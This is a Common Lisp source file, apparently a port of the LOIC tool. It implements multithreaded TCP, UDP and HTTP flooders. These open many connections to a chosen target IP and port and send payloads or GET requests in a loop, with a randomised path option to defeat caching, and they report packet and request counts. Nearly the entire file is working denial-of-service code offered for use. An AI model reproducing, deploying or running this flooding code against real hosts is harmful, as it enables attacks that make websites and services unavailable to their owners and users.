
(in-package loic)

;; types

(deftype delay () '(integer 0 20))
(deftype port () '(integer 0 65535))
(deftype flooder-count () '(integer 0 100))

(defclass flooder ()
  ((target-ip :type string :initform "127.0.0.1" :initarg :target-ip :accessor target-ip)
   (target-port :type port :initform 80 :initarg :target-port :accessor target-port)
   (delay :type delay :initform 1 :initarg :delay :accessor delay)
   (connections :type flooder-count :initform 10 :initarg :connections :accessor connections)
   (is-flooding :type boolean :initform nil :reader is-flooding)
   (threads)))

(defclass xxp-flooder (flooder)
  ((data :type string :initform ":P" :accessor data)
   ; Statistics
   (flood-count :type integer :initform 0 :reader flood-count)))

(defclass tcp-flooder (xxp-flooder) ())
(defclass udp-flooder (xxp-flooder) ())

(defclass http-flooder (flooder)
  ((subsite :type string :initform "/" :initarg :subsite :accessor subsite)
   (add-random-subsite :type boolean :initform nil :initarg :add-random-subsite :accessor add-random-subsite)
   (timeout :type integer :initform 60 :initarg :timeout :accessor timeout)
   ; Statistics
   (downloaded :type integer :initform 0 :reader downloaded)
   (requested :type integer :initform 0 :reader requested)
   (failed :type integer :initform 0 :reader failed)))

;; Some helpers

(defun random-string (&optional (min 5) (max 10))
  "Create a random string of given size"
  (let ((size (+ (random (- max min -1)) min)))
    (coerce (loop :for i :below size
                  :collect (code-char (+ (random 26) 65)))
            'string)))

(defun hostname->address (hostname)
  "Resolve hostname or parse ip string into an ip vector"
  (host-ent-address (get-host-by-name hostname)))

(defun make-thread (function)
  "Spawns a thread"
  #+ecl  (mp:process-run-function "flooder" function)
  #+sbcl (sb-thread:make-thread function))

(defun listen-with-timeout (stream timeout)
  "Returns t if stream becomes readable in specified time"
  (loop :for i :below timeout
        :until (listen stream)
        :do (sleep 1))
  (listen stream))

;; delay

(defgeneric delay (flooder) (:documentation "Rest a bit"))

(defmethod delay ((flooder flooder))
  (with-slots (delay) flooder
    (when (> delay 0)
      (sleep delay))))

;; flood

(defgeneric flood (flooder) (:documentation "Do the flooding"))

(defmethod flood ((flooder tcp-flooder))
  (loop :while (is-flooding flooder)
        :do (handler-case (let ((socket (make-instance 'inet-socket
                                                       :protocol :tcp
                                                       :type :stream)))
                            (socket-connect socket (hostname->address (target-ip flooder)) (target-port flooder))
                            (loop :while (is-flooding flooder)
                                  :while (socket-open-p socket)
                                  :do (socket-send socket (string-to-utf-8-bytes (data flooder)) nil)
                                  :do (delay flooder))
                            (when (socket-open-p socket)
                              (socket-close socket)))
              (socket-error (c) nil))
        :do (delay flooder)))

(defmethod flood ((flooder udp-flooder))
  (loop :while (is-flooding flooder)
        :do (handler-case (let ((socket (make-instance 'inet-socket
                                                       :protocol :udp
                                                       :type :datagram))
                                (data (string-to-utf-8-bytes (data flooder))))
                            (socket-connect socket (hostname->address (target-ip flooder)) (target-port flooder))
                            (loop :while (is-flooding flooder)
                                  :do (socket-send socket data nil)
                                  :do (delay flooder))
                            (socket-close socket))
              (socket-error (c) nil))
        :do (delay flooder)))

(defmethod flood ((flooder http-flooder))
  (loop :while (is-flooding flooder)
        :do (handler-case (let ((data (format nil "GET ~A~@[~A~] HTTP/1.0~%~%~%"
                                              (subsite flooder)
                                              (when (add-random-subsite flooder) (random-string))))
                                (socket (make-instance 'inet-socket 
                                                       :protocol :tcp
                                                       :type :stream)))
                            (socket-connect socket (hostname->address (target-ip flooder)) (target-port flooder))
                            (socket-send socket data nil)
                            (incf (slot-value flooder 'requested))
                            (if (listen-with-timeout (socket-make-stream socket :input t) (timeout flooder))
                              (incf (slot-value flooder 'downloaded))
                              (incf (slot-value flooder 'failed)))
                            (socket-close socket))
              (sb-int:simple-stream-error (c) nil)
              (socket-error (c) nil))
        :do (delay flooder)))

;; get-stats

(defgeneric get-stats (flooder) (:documentation "Returns the statistics for the given flooder"))

(defmethod get-stats ((flooder xxp-flooder))
  (format nil "Packets sent: ~D" (flood-count flooder)))

(defmethod get-stats ((flooder http-flooder))
  (format nil "Requested pages: ~D; Received pages: ~D; Failed requests: ~D"
          (requested flooder)
          (downloaded flooder)
          (failed flooder)))

;; start-flooders

(defgeneric start-flooder (flooder) (:documentation "Create the threads and start flooders"))

(defmethod start-flooder ((flooder flooder))
  (unless (is-flooding flooder)
    (setf (slot-value flooder 'is-flooding) t)
    (setf (slot-value flooder 'threads)
          (loop :for i :below (connections flooder)
                :collect (make-thread (lambda () (flood flooder)))))
    t))

;; stop-flooders

(defgeneric stop-flooder (flooder) (:documentation "Stop flooders and terminate threads"))

(defmethod stop-flooder ((flooder flooder))
  (setf (slot-value flooder 'is-flooding) nil))

; vim: set lisp softtabstop=2 expandtab filetype=lisp:
